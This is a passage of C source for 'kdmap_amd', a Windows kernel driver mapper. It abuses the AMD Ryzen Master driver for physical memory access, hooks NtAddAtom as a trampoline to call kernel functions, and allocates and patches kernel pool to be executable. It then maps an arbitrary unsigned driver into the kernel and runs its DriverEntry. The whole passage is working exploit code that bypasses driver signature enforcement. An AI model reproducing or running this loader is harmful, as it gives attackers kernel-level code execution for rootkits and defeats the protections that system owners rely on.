        printf("[!] ExAllocatePool2 returned 0, falling back to ExAllocatePoolWithTag\n");
    }

    /* Fallback: ExAllocatePoolWithTag — NX pool, requires CR3 for PTE clear */
    uint32_t rva = disk_export_rva("ExAllocatePoolWithTag");
    if (!rva) {
        printf("[-] ExAllocatePoolWithTag not found in disk PE\n");
        return 0;
    }
    if (!g_kernel_cr3) {
        printf("[-] ExAllocatePool2 unavailable and CR3=0: cannot make pool executable\n");
        printf("    This build needs ExAllocatePool2 (Win10 20H1+, build 19041+)\n");
        return 0;
    }
    printf("[*] alloc_pool: ExAllocatePoolWithTag(NonPagedPool=0, 0x%llX) — pool will be NX\n",
           (unsigned long long)size);
    /* ExAllocatePoolWithTag(POOL_TYPE type, SIZE_T size, ULONG tag) */
    uint64_t result = call_kernel_fn(g_ntoskrnl_va + rva,
                                     (uint64_t)NonPagedPool, size, (uint64_t)POOL_TAG, 0);
    if (result) {
        printf("[+] ExAllocatePoolWithTag → pool_kva=0x%llX (NX, will patch PTEs)\n",
               (unsigned long long)result);
        g_pool_is_exec = 0;
    }
    return result;
}

static int free_pool(uint64_t addr)
{
    static uint64_t fn_ExFree = 0;
    if (!fn_ExFree) {
        uint32_t r = disk_export_rva("ExFreePool");
        if (r) fn_ExFree = g_ntoskrnl_va + r;
    }
    if (!fn_ExFree) return 0;
    call_kernel_fn(fn_ExFree, addr, 0, 0, 0);
    return 1;
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  PE MANIPULATION
 * ══════════════════════════════════════════════════════════════════════ */

static void pe_apply_relocs(uint8_t *image, uint64_t delta)
{
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
    DWORD reloc_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD reloc_sz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (!reloc_rva || !reloc_sz) { printf("[!] No relocations\n"); return; }
    IMAGE_BASE_RELOCATION *blk = (IMAGE_BASE_RELOCATION*)(image + reloc_rva);
    IMAGE_BASE_RELOCATION *end = (IMAGE_BASE_RELOCATION*)(image + reloc_rva + reloc_sz);
    uint32_t fixed = 0;
    while (blk < end && blk->SizeOfBlock) {
        uint8_t  *page = image + blk->VirtualAddress;
        uint16_t *item = (uint16_t*)((uint8_t*)blk + sizeof(IMAGE_BASE_RELOCATION));
        uint32_t  cnt  = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
        for (uint32_t i = 0; i < cnt; i++) {
            uint16_t type = item[i] >> 12, off = item[i] & 0xFFF;
            if (type == 10) { *(uint64_t*)(page + off) += delta; fixed++; }
        }
        blk = (IMAGE_BASE_RELOCATION*)((uint8_t*)blk + blk->SizeOfBlock);
    }
    printf("[*] Relocations: %u fixed  delta=0x%llX\n", fixed, (unsigned long long)delta);
}

static int pe_resolve_imports(uint8_t *image)
{
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
    DWORD imp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!imp_rva) { printf("[*] No imports\n"); return 1; }
    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR*)(image + imp_rva);
    int all_ok = 1;

    while (imp->FirstThunk) {
        char *mod_name = (char*)(image + imp->Name);

        /* Determine module kernel VA and load its disk PE for export resolution.
         * Avoids get_kernel_export() which needs kernel_read() → CR3. */
        uint64_t  mod_kva      = 0;
        uint8_t  *mod_disk_pe  = NULL;
        DWORD     mod_disk_sz  = 0;
        int       is_ntoskrnl  = 0;

        if (_stricmp(mod_name,"ntoskrnl.exe")==0 ||
            _stricmp(mod_name,"ntkrnlmp.exe")==0  ||
            _stricmp(mod_name,"ntkrpamp.exe")==0) {
            mod_kva     = g_ntoskrnl_va;
            is_ntoskrnl = 1;
            /* g_ntoskrnl_pe already loaded — no extra disk read needed */
        } else {
            mod_kva = get_kernel_module_base(mod_name);
            if (!mod_kva)
                printf("[!] %s not loaded in kernel\n", mod_name);
            else {
                mod_disk_pe = load_module_disk_pe(mod_name, &mod_disk_sz);
                if (!mod_disk_pe)
                    printf("[!] %s disk PE not found in System32/drivers\n", mod_name);
            }
        }

        DWORD hint_rva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
        IMAGE_THUNK_DATA64 *orig  = (IMAGE_THUNK_DATA64*)(image + hint_rva);
        IMAGE_THUNK_DATA64 *thunk = (IMAGE_THUNK_DATA64*)(image + imp->FirstThunk);

        while (orig->u1.Function) {
            if (orig->u1.Ordinal & (1ULL<<63)) { orig++; thunk++; continue; }
            IMAGE_IMPORT_BY_NAME *by_name = (IMAGE_IMPORT_BY_NAME*)(image + orig->u1.AddressOfData);
            const char *fn_name = by_name->Name;
            uint64_t fn_kva = 0;

            if (is_ntoskrnl) {
                /* Use cached disk PE — zero kernel reads, no CR3 needed */
                uint32_t rva = disk_export_rva(fn_name);
                fn_kva = rva ? (g_ntoskrnl_va + rva) : 0;
            } else if (mod_kva && mod_disk_pe) {
                uint32_t rva = pe_export_rva(mod_disk_pe, mod_disk_sz, fn_name);
                fn_kva = rva ? (mod_kva + rva) : 0;
            }

            if (!fn_kva) {
                printf("[-] Unresolved: %s!%s\n", mod_name, fn_name);
                all_ok = 0;
            } else {
                printf("    [+] %s!%s → 0x%llX\n", mod_name, fn_name,
                       (unsigned long long)fn_kva);
                thunk->u1.Function = fn_kva;
            }
            orig++; thunk++;
        }

        if (mod_disk_pe) free(mod_disk_pe);
        imp++;
    }
    return all_ok;
}

static void pe_fix_security_cookie(uint8_t *image, uint64_t pool_kva)
{
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
    DWORD cfg_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    if (!cfg_rva) return;
    typedef struct {
        DWORD Size; DWORD TimeDateStamp; WORD MajorVersion, MinorVersion;
        DWORD GlobalFlagsClear, GlobalFlagsSet, CriticalSectionDefaultTimeout;
        ULONGLONG DeCommitFreeBlockThreshold, DeCommitTotalFreeThreshold;
        ULONGLONG LockPrefixTable, MaximumAllocationSize, VirtualMemoryThreshold;
        ULONGLONG ProcessAffinityMask; DWORD ProcessHeapFlags, CSDVersion;
        WORD DependentLoadFlags; ULONGLONG EditList, SecurityCookie;
    } LC64;
    LC64 *lc = (LC64*)(image + cfg_rva);
    if (!lc->SecurityCookie) return;
    uint64_t cookie_rva = lc->SecurityCookie - nt->OptionalHeader.ImageBase;
    if (cookie_rva >= nt->OptionalHeader.SizeOfImage) return;
    uint64_t *cookie_ptr = (uint64_t*)(image + cookie_rva);
    *cookie_ptr = 0x2B992DDFA232ULL ^ (uint64_t)GetCurrentProcessId()
                ^ (uint64_t)GetCurrentThreadId() ^ (uint64_t)(uintptr_t)image ^ pool_kva;
    printf("[*] Security cookie patched\n");
}

/* ══════════════════════════════════════════════════════════════════════
 * §9  MAP DRIVER
 * ══════════════════════════════════════════════════════════════════════ */

uint64_t map_driver(const char *path, int free_after)
{
    printf("\n[*] Loading: %s\n", path);

    /* ── STEP A: Read file ── */
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) { printf("[-] Cannot open: err=%lu\n", GetLastError()); return 0; }
    DWORD file_sz = GetFileSize(hf, NULL);
    uint8_t *file_buf = (uint8_t*)malloc(file_sz);
    DWORD rd = 0; ReadFile(hf, file_buf, file_sz, &rd, NULL); CloseHandle(hf);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)file_buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { printf("[-] Not a PE\n"); free(file_buf); return 0; }
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)(file_buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[-] Not a 64-bit PE\n"); free(file_buf); return 0;
    }
    DWORD    image_sz   = nt->OptionalHeader.SizeOfImage;
    DWORD    header_sz  = nt->OptionalHeader.SizeOfHeaders;
    uint64_t preferred  = nt->OptionalHeader.ImageBase;
    DWORD    entry_rva  = nt->OptionalHeader.AddressOfEntryPoint;

    printf("[+] PE parsed OK\n");
    LOG_HEX("  SizeOfImage",      image_sz);
    LOG_HEX("  EntryPointRVA",    entry_rva);
    LOG_HEX("  PreferredBase",    preferred);
    LOG_HEX("  NumberOfSections", nt->FileHeader.NumberOfSections);

    PAUSE("A: PE parsed",
          "  PE file read & parsed.  No kernel contact yet.\n"
          "  Safe to continue — next step calls ExAllocatePool2/ExAllocatePoolWithTag.");

    /* ── STEP B: Allocate NonPagedPool ── */
    printf("[*] Allocating kernel pool (0x%lX bytes)...\n", (unsigned long)image_sz);
    uint64_t pool_kva = alloc_pool(image_sz);
    if (!pool_kva) { printf("[-] alloc_pool failed\n"); free(file_buf); return 0; }

    LOG_HEX("  pool_kva",     pool_kva);
    LOG_HEX("  pool_pa",      va_to_pa(pool_kva));
    LOG_HEX("  pool_is_exec", (uint64_t)g_pool_is_exec);

    PAUSE("B: Pool allocated",
          "  ExAllocatePool2/ExAllocatePoolWithTag succeeded via NtAddAtom trampoline.\n"
          "  Check pool_is_exec above: 1=RWX (no PTE patch needed), 0=NX (will patch).\n"
          "  Next: build staged image in userland (no kernel contact).");

    /* ── STEP C: Build staged image in userland ── */
    uint8_t *staged = (uint8_t*)calloc(1, image_sz);
    if (!staged) { free(file_buf); return 0; }
    memcpy(staged, file_buf, header_sz);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!sec[i].VirtualAddress || !sec[i].SizeOfRawData) continue;
        DWORD voff = sec[i].VirtualAddress, roff = sec[i].PointerToRawData, rsz = sec[i].SizeOfRawData;
        if (voff + rsz > image_sz || roff + rsz > file_sz) continue;
        memcpy(staged + voff, file_buf + roff, rsz);
        printf("[*] Section %-8.8s  RVA=0x%08lX  raw=0x%lX\n",
               sec[i].Name, (unsigned long)voff, (unsigned long)rsz);
    }
    free(file_buf);

    uint64_t delta = pool_kva - preferred;
    if (delta) pe_apply_relocs(staged, delta);
    pe_fix_security_cookie(staged, pool_kva);

    printf("[*] Resolving imports...\n");
    if (!pe_resolve_imports(staged))
        printf("[!] Some imports unresolved — driver may crash\n");

    LOG_BYTES("  staged EntryPoint bytes", staged + entry_rva, 16);

    PAUSE("C: Staged image ready",
          "  PE relocated + imports patched in userland buffer.\n"
          "  Next: write image to pool via MmGetPhysicalAddress + phys_write (no CR3).");

    /* ── STEP D: Write image to pool ── */
    printf("[*] Writing driver image to kernel pool...\n");
    int write_ok = g_kernel_cr3
        ? kernel_write(pool_kva, staged, image_sz)
        : kernel_write_via_mmpa(pool_kva, staged, image_sz);
    if (!write_ok) {
        printf("[-] kernel_write failed\n"); free(staged); free_pool(pool_kva); return 0;
    }

    if (g_kernel_cr3) {
        uint8_t rb[16] = {0};
        kernel_read(pool_kva, rb, 16);
        LOG_BYTES("  pool[0..15] readback", rb, 16);
        LOG_BYTES("  staged[0..15]       ", staged, 16);
        if (memcmp(rb, staged, 16) == 0) printf("    [+] Readback matches staged\n");
        else                              printf("    [!] READBACK MISMATCH\n");

        uint8_t ep[16] = {0};
        kernel_read(pool_kva + entry_rva, ep, 16);
        LOG_BYTES("  pool[EntryPoint]     ", ep, 16);
        LOG_BYTES("  staged[EntryPoint]   ", staged + entry_rva, 16);
        if (memcmp(ep, staged + entry_rva, 16) == 0) printf("    [+] EntryPoint readback matches\n");
        else printf("    [!] EntryPoint MISMATCH\n");
    }
    free(staged);

    PAUSE("D: kernel_write done",
          "  Driver image written to NonPagedPool.\n"
          "  Next: handle NX bits (if pool_is_exec=0 and CR3 available).");

    /* ── STEP E: Clear NX bits if needed ── */
    if (g_pool_is_exec) {
        printf("[+] ExAllocatePool2(EXEC) used — pool already executable, skipping PTE patch\n");
    } else if (g_kernel_cr3) {
        printf("[*] Clearing NX bits in pool PTEs (ExAllocatePoolWithTag path)...\n");
        make_pool_executable(pool_kva, image_sz);
    } else {
        /* Should not reach here: alloc_pool blocks this case */
        printf("[-] FATAL: NX pool + no CR3 — cannot make pool executable\n");
        free_pool(pool_kva);
        return 0;
    }

    /* PTE spot-check for entry point page */
    if (g_kernel_cr3) {
        uint64_t ep_va  = pool_kva + entry_rva;
        uint64_t pte_v  = 0;
        uint64_t pte_pa = va_to_pte_pa(ep_va, &pte_v);
        printf("    EntryPoint page PTE:\n");
        LOG_HEX("      pte_pa",  pte_pa);
        LOG_HEX("      pte_val", pte_v);
        if (pte_v >> 63) printf("    [!] WARNING: NX bit still SET on entry page!\n");
        else             printf("    [+] NX bit cleared on entry page — executable.\n");
    }

    PAUSE("E: Pool ready to execute",
          "  Pool pages are executable.\n"
          "  Next: call_kernel_fn(DriverEntry, NULL, NULL).\n"
          "  *** HIGHEST BSOD RISK: HVCI, bad driver code, or missing imports ***");

    /* ── STEP F: Call DriverEntry ── */
    uint64_t entry_kva = pool_kva + entry_rva;

    /* Flush CPU caches before execution.
     * phys_write goes via UC (MmMapIoSpace). Pool pages are WB-mapped — CPU
     * I-cache may still hold zeros from ExAllocatePool2's zero-fill. Without
     * a flush, instruction fetch reads zeros and immediately faults. */
    {
        uint32_t kica_rva = disk_export_rva("KeInvalidateAllCaches");
        if (kica_rva) {
            printf("[*] Flushing CPU caches (KeInvalidateAllCaches)...\n");
            call_kernel_fn(g_ntoskrnl_va + kica_rva, 0, 0, 0, 0);
            printf("[+] Cache flush OK\n");
        } else {
            printf("[!] KeInvalidateAllCaches not found — cache may be stale!\n");
        }
    }

    printf("[*] Calling DriverEntry(NULL, NULL)...\n");
    LOG_HEX("  entry_kva", entry_kva);

    uint64_t status = call_kernel_fn(entry_kva, 0, 0, 0, 0);

    printf("[%s] DriverEntry returned NTSTATUS=0x%llX\n",
           (status == 0 || status == 0x00000001) ? "+" : "!",
           (unsigned long long)status);

    PAUSE("F: DriverEntry returned",
          "  DriverEntry has returned.  Driver is now active.");

    if (free_after) {
        free_pool(pool_kva);
        printf("[*] Pool freed\n");
        return 0;
    }
    return pool_kva;
}

/* ══════════════════════════════════════════════════════════════════════
 * §10  SETUP
 * ══════════════════════════════════════════════════════════════════════ */

static int setup(void)
{
    MOD_LIST *ml = get_module_list();
    if (!ml) { printf("[-] NtQuerySystemInformation failed\n"); return 0; }
    g_ntoskrnl_va = (uint64_t)ml->Modules[0].ImageBase;
    DWORD nt_size = ml->Modules[0].ImageSize;
    printf("[+] ntoskrnl VA=0x%llX  size=0x%lX\n",
           (unsigned long long)g_ntoskrnl_va, (unsigned long)nt_size);

    char nt_path[MAX_PATH*2];
    const char *fn = ml->Modules[0].FullPathName + ml->Modules[0].OffsetToFileName;
    char sysdir[MAX_PATH]; GetSystemDirectoryA(sysdir, sizeof sysdir);
    snprintf(nt_path, sizeof nt_path, "%s\\%s", sysdir, fn);
    if (GetFileAttributesA(nt_path) == INVALID_FILE_ATTRIBUTES)
        snprintf(nt_path, sizeof nt_path, "%s\\ntoskrnl.exe", sysdir);
    free(ml);

    HANDLE hf = CreateFileA(nt_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open %s\n", nt_path);
    } else {
        g_ntoskrnl_pe_sz = GetFileSize(hf, NULL);
        g_ntoskrnl_pe    = (uint8_t*)malloc(g_ntoskrnl_pe_sz);
        DWORD rd2 = 0; ReadFile(hf, g_ntoskrnl_pe, g_ntoskrnl_pe_sz, &rd2, NULL);
        CloseHandle(hf);
        printf("[+] ntoskrnl disk image: %lu bytes\n", (unsigned long)g_ntoskrnl_pe_sz);
    }

    printf("[*] Scanning for ntoskrnl PA...\n");
    uint64_t nt_pa = find_ntoskrnl_pa();
    if (!nt_pa) { printf("[-] ntoskrnl PA not found\n"); return 0; }
    g_ntoskrnl_pa = nt_pa;

    printf("[*] Finding kernel CR3 (verified)...\n");
    g_kernel_cr3 = find_kernel_cr3_verified(g_ntoskrnl_va, nt_pa);
    if (!g_kernel_cr3) {
        printf("[!] Verified CR3 not found, trying self-ref fallback...\n");
        g_kernel_cr3 = find_kernel_cr3();
        if (g_kernel_cr3)
            printf("[+] CR3=0x%llX (self-ref, may be wrong on KPTI)\n",
                   (unsigned long long)g_kernel_cr3);
        else
            printf("[!] CR3 not found — will use ExAllocatePool2 for executable pool\n");
    }

    if (g_kernel_cr3) {
        uint64_t nt_pa_check = va_to_pa(g_ntoskrnl_va);
        if (!nt_pa_check) {
            printf("[!] va_to_pa(ntoskrnl) failed — CR3 wrong, marking unusable\n");
            g_kernel_cr3 = 0;
        } else if (nt_pa_check != nt_pa) {
            printf("[!] PA mismatch: scan=0x%llX  va_to_pa=0x%llX — CR3 wrong, marking unusable\n",
                   (unsigned long long)nt_pa, (unsigned long long)nt_pa_check);
            g_kernel_cr3 = 0;
        } else {
            printf("[+] ntoskrnl PA=0x%llX  va_to_pa consistent\n", (unsigned long long)nt_pa);
        }
    }

    printf("\n    ── Key addresses ──────────────────────────────────\n");
    LOG_HEX("    ntoskrnl VA",  g_ntoskrnl_va);
    LOG_HEX("    ntoskrnl PA",  nt_pa);
    LOG_HEX("    kernel CR3",   g_kernel_cr3);
    {
        uint32_t atom_rva = disk_export_rva("NtAddAtom");
        LOG_HEX("    NtAddAtom VA",   g_ntoskrnl_va + atom_rva);
        LOG_HEX("    NtAddAtom PA",   g_ntoskrnl_pa + atom_rva);   /* direct, no CR3 */
        LOG_HEX("    ExAllocatePool2 RVA", (uint64_t)disk_export_rva("ExAllocatePool2"));
        LOG_HEX("    ExAllocatePoolWithTag RVA", (uint64_t)disk_export_rva("ExAllocatePoolWithTag"));
    }
    printf("    ──────────────────────────────────────────────────\n\n");

    return 1;
}

/* ══════════════════════════════════════════════════════════════════════
 * §11  MAIN
 * ══════════════════════════════════════════════════════════════════════ */

int main(int argc, char **argv)
{
    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, NULL, _IONBF, 0);
    {HANDLE h=GetStdHandle(STD_OUTPUT_HANDLE);DWORD m=0;
     if(GetConsoleMode(h,&m)) SetConsoleMode(h,m|0x0004);}

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║     kdmap_amd — Driver Loader (AMD Ryzen Master) [v9]    ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    if (argc < 2) {
        printf("Usage: %s <driver.sys> [--free]\n", argv[0]);
        return 1;
    }
    const char *driver_path = argv[1];
    int free_after = (argc >= 3 && strcmp(argv[2], "--free") == 0);

    /* ── STEP 0: Open AMD driver ── */
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open AMDRyzenMasterDriverV20: err=%lu\n", GetLastError());
        return 1;
    }
    printf("[+] AMD driver handle opened\n");

    load_ranges();
    printf("[+] Physical ranges: %d\n", g_nranges);
    for (int i = 0; i < g_nranges && i < 8; i++)
        printf("    [%d] PA=0x%llX  size=0x%llX\n", i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)g_ranges[i].size);
    if (!g_nranges) { printf("[-] No physical ranges\n"); return 1; }

    PAUSE("0: AMD driver open + phys ranges",
          "  AMD driver open, physical RAM ranges loaded.\n"
          "  No kernel modifications yet.  Safe to continue.");

    /* ── STEP 1: Kernel setup ── */
    if (!setup()) { CloseHandle(g_dev); return 1; }

    PAUSE("1: ntoskrnl + CR3 status",
          "  ntoskrnl PA located.  CR3 may or may not be valid (see above).\n"
          "  No kernel modifications yet.\n"
          "  Next: self-test — NtAddAtom trampoline fires ExGetPreviousMode once.");

    /* ── STEP 2: Self-test trampoline (verbose) ── */
    printf("[*] Self-test: ExGetPreviousMode via NtAddAtom trampoline...\n");
    {
        uint32_t _rva = disk_export_rva("ExGetPreviousMode");
        uint64_t fn = _rva ? (g_ntoskrnl_va + _rva) : get_kernel_export(g_ntoskrnl_va, "ExGetPreviousMode");
        LOG_HEX("  ExGetPreviousMode kva", fn);
        if (fn) {
            g_ckf_verbose = 1;
            uint64_t mode = call_kernel_fn(fn, 0, 0, 0, 0);
            g_ckf_verbose = 0;
            printf("    ExGetPreviousMode returned: 0x%llX  (expect 1=UserMode)\n",
                   (unsigned long long)mode);
            if (mode != 1) {
                printf("[-] Trampoline BROKEN — aborting\n");
                if (g_ntoskrnl_pe) free(g_ntoskrnl_pe);
                CloseHandle(g_dev);
                return 1;
            }
            printf("    [+] Trampoline OK\n");
        } else {
            printf("    [!] ExGetPreviousMode not found — skipping self-test\n");
        }
    }

    PAUSE("2: Trampoline self-test passed",
          "  NtAddAtom hook installed + fired + restored successfully.\n"
          "  ExGetPreviousMode returned 1 (UserMode) as expected.\n"
          "  Next: map_driver() — full loading chain.");

    /* ── STEP 3: Full driver load ── */
    printf("\n");
    uint64_t loaded = map_driver(driver_path, free_after);
    if (loaded) {
        printf("\n[+] Driver loaded at kva=0x%llX — active until reboot.\n",
               (unsigned long long)loaded);
    } else if (free_after) {
        printf("\n[+] Driver executed and pool freed.\n");
    } else {
        printf("\n[-] Driver load FAILED.\n");
    }

    if (g_ntoskrnl_pe) free(g_ntoskrnl_pe);
    CloseHandle(g_dev);
    return (loaded || free_after) ? 0 : 1;
}
